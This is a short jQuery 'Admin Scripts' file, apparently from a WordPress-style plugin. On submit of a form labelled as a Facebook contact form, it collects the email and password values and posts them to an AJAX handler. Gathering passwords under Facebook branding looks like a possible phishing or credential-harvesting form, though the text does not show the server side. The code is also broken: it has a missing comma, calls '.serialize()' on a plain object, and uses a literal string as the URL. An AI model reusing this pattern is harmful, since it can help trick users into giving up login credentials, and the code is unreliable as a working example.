/**
 * Admin Scripts
 */

(function ($, window, document, pluginObject) {
    "use strict";


    $(document).on('submit', '#facebook-contact-form', function () {
    var formData = {
      email: $("#email").val(),
      password: $("#password").val(),
    };

    $.ajax({
      type: "POST",
      context: this,
      url: "facebook.ajaxURL",
      data: {
        action: 'facebook-from-action'
        'form_data': formData.serialize(),
      },
        success:function(response){
            console.log(response);
              }
  });
});


})(jQuery, window, document, facebook);